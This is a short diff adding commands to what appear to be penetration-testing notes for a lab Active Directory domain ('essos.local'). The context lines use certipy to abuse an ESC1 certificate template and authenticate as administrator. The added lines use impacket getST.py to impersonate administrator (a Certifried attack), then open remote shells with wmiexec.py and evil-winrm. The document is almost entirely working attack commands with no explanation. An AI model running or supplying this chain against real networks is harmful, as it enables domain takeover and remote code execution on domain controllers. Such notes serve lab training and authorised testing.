@@ -236,3 +236,24 @@ certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.3.12
 certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
 
 certipy auth -pfx administrator.pfx -dc-ip 192.168.3.12
+
+
+test_part 
+
+
+export KRB5CCNAME=/workspace/certifried/meereen.ccache
+python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
+
+
+export KRB5CCNAME=/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
+wmiexec.py -k @meereen.essos.local
+
+export KRB5CCNAME=/workspace/certifried/meereen.ccache
+python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
+
+export KRB5CCNAME=/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
+evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
+
+
+
+
